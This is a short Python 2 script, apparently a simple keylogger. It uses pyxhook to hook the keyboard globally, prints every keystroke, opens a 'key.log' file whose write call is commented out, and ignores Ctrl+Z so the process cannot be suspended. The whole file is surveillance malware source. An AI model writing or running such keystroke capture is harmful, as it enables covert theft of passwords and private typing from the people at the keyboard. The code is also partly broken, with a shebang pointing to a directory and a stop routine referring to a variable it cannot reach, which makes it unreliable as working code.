#!/usr/lib/python2.7

import pyxhook
import sys

# To prevent script from exiting via pressing Ctrl+Z ...
import signal


def handler(signum, frame):
    print "Pressed Ctrl + Z but ignoring it ..."


signal.signal(signal.SIGTSTP, handler)



fp=open('key.log', 'a')

def listen(event):
    # fp.write(event.Key)
    print event.Key

    # if event.Key=='Contol_L':



def start():
    # Define a HookManager ...
    hook=pyxhook.HookManager()

    # Register a callback for keypress events ...
    hook.KeyDown=listen

    # Hook the keyboard ...
    hook.HookKeyboard()

    # Start the session ...
    hook.start()


def stop():
    fp.close()
    hook.cancel()



if __name__=='__main__':

    if len(sys.argv) < 2:
        exit('The command expects an explicit argument [start / stop] ...')

    elif sys.argv[1].lower() == 'start':
        start()

    elif sys.argv[1].lower() == 'stop':
        stop()
